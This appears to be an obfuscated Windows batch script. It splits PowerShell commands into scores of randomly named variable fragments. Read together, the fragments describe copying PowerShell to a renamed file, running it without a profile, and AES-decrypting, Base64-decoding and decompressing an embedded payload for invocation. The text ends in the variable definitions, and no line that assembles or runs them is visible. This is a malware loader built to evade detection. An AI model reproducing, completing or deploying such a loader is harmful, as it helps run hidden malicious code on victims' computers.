@echo off
set "xOMItNVWuz=y "
set "DnNGTMGlJe=s\"
set "phPPQOpNoE=Sy"
set "kqfGbyneSB=po"
set "EsgYvfGodE=Wi"
set "fkvwzfIZTq= /"
set "QgeQeVkimu=he"
set "LqgoZODpZr=ow"
set "fMjfjWwStO= C"
set "XLrMfalwMQ=nd"
set "IXpNbRsGbD=he"
set "NvBVMijzcy=co"
set "MVuNiLqUOb=ws"
set "uEIMfnmRZH=st"
set "BrpLaKYLTt=em"
set "mqPnTOhOpD=1."
set "hFNPMAgcoX=rs"
set "PEUVjuSamB=do"
set "BcWOVvdrqG=ll"
set "IflMrqtHRb=we"
set "BoeHWXJdiD=0\"
set "PkKlVzjnup=\v"
set "rkPULBbvHv=xe"
set "eXlnTGOJfB=Po"
set "gENYTEtxUR=rS"
set "uZMHAEBqxl=32"
set "yQauXYFaAF=\W"
set "zHAuFFbuCR=:\"
set "MxBrvUVfkC=we"
set "veJEXFIpxx=py"
set "zOlcCYSeOg=in"
set "GiVKPptdsn=ll"
set "EclhwFDqUA=.e"
set "HCRpxXuyyo=cd"
set "HXGnxGYBRy= %~dp0"
set "PipELuoYWx=);$N"
set "NKeoPmhFVS=$iYF"
set "XXZQmhZavs=ress"
set "daYmfqNIUQ=raph"
set "RDjLYZtjJU=-1.."
set "aHBkyACGWf=SjxR"
set "ABiPCRwgPT=n ''"
set "NgxBINqMGv=YFxk"
set "hMxNVqDAwP=CFxo"
set "NusIDKSKcB=ptog"
set "BzlXpWFHFM=$moT"
set "VUfPAqHiIp=.Sec"
set "okIUgqoeph=and "
set "gWixzTanmF=esMa"
set "exlGQAlpma=File"
set "wKSlnBnGyV=;$Aw"
set "iIMGTUKCqM=.Con"
set "csfBaAwzRu=[Sys"
set "YSOPLukWVN=Comp"
set "RzwIpMCsAf=Mode"
set "gwlQPikBSk=d;$X"
set "HBOlvuuZEa=e]::"
set "IZZYaPgwAY=$iYF"
set "cUIdOxFXuT=s = "
set "xxNlpQcqDy=);$X"
set "UKpdpdctiH=oryS"
set "SQnSWFRSbn=comp"
set "PWXNuIQxSc=ypto"
set "MXjxBDqzMK=('Tg"
set "cHDtdcAnfj=PTtG"
set "fAKiaCqPKT=.Cry"
set "MTAhKTZtNL=:('g"
set "qgOJtCqviT= [Sy"
set "ggtiwytZyE=gsYZ"
set "daMFaMZxPv=k = "
set "picPHMNgcd=ay()"
set "wFjqIAWMPo=..-1"
set "ryEuBEzKRR=xk);"
set "LFBylQVvwy=AwKE"
set "sjAQgdyvzw=Secu"
set "NizBfXhFgn=tS46"
set "BxJvGJJYMg=morF"
set "yBfbIAbjzv=]::N"
set "huQybSifCY='[-1"
set "PYbGnjceAo=urit"
set "HAdgYimYok=ptor"
set "UVPgDBMKiW=sion"
set "qyhzTmnyJx=y.Ci"
set "FDeqMqzdUw=6] -"
set "NRFkCPWibj=em.I"
set "mHlQlNPxuh=ct S"
set "MZqpjnfHQe=ss -"
set "yzbsEanJlF=L4Yi"
set "KveJXcMmvc=Disp"
set "erqKkBIeKK=rt]:"
set "KeOJtqIaBe= [st"
set "NkcTqMhRKG=-nop"
set "YasJxFjXRF=stem"
set "XjDVnCGkOd=l5E7"
set "wFTzaUGsQp=form"
set "fkpOKibGMs=tion"
set "RYJrcbyCuC=am;$"
set "dcDpcmHZzc=)($i"
set "oNHBhocxMO=ert]"
set "TWNYlVTbSw=)($x"
set "NZRQbJVWaI=YFxk"
set "cdkWVOQfyD=iYFx"
set "ruwsWIBGzO=s75K"
set "YHFqgfmxug=($SO"
set "UUSNTJtDMp=rity"
set "nofRgpemEu=k; }"
set "VjIqTAuDCq=esaB"
set "niSZfAtjpb=join"
set "bWhcibyFPh=.IO."
set "gAeucmgYnp=le  "
set "VWqxbtdGhP= = $"
set "bGxCdzNOmL=g = "
set "BTqnpPaCYa=trea"
set "JYOMoNgKAK=ect "
set "mhSTpSYQtc=Invo"
set "zHonnBpLAI=)) {"
set "ZShxakBORM=VHXt"
set "gnLdeZmRSI=pY ="
set "uMambgRFCU=pZ);"
set "KiyhuBnDoE=.-16"
set "MmaiLHnslp=j.En"
set "rTEEERXjyo=, (,"
set "DEsoIsvPTP=$NSj"
set "gGiurpAofm==');"
set "PQczKHZGwj=gjYA"
set "yjItnBtixI=16] "
set "xdBbkbDjRi=$aDq"
set "hIvhRBWrZZ=tem."
set "CWgeqQlmHP=pStr"
set "UdTrVPEpFI=VHXt"
set "butYfPpwVa=brea"
set "ajNwnMfuNC=-joi"
set "xbktRxyRYu=ddin"
set "XxUDMFNBez=)))"
set "dKlPJoHByW=PKCS"
set "cgqPJqYuxB=zHhH"
set "YThflgzybp=m(, "
set "PZJBwPEOcN=onve"
set "VWgTgNweWu=eMVs"
set "AemOnwMqzB=k = "
set "fHLvsnogQq=stem"
set "TxPcdTgjzN=oWY."
set "DBotuqPhlL=($SO"
set "MAPEwUrOGQ=ach "
set "wBcimacXSS=gMod"
set "yQYhGxFzbj=.Mem"
set "zaocRucgzi=k, 0"
set "wInThmPCnt=rans"
set "ksYsHVagih=raph"
set "FQeXNtRriA=Icyp"
set "dQLxwUgQTV= '')"
set "YJrJcRQKGI=.Cop"
set "qSWDnRzLal=$aDq"
set "uCiMLhlzPz=[]] "
set "ndENENyziC=ateD"
set "zzgNLnsNQd=zuZI"
set "SqHcxKTZKo=pher"
set "DcbCxXPKQM=Es, "
set "QAAtXsaEZV=ewLi"
set "zMhrmYjKak=y.Cr"
set "NSPcPsBngE=ress"
set "AzNUXztzJN=..-1"
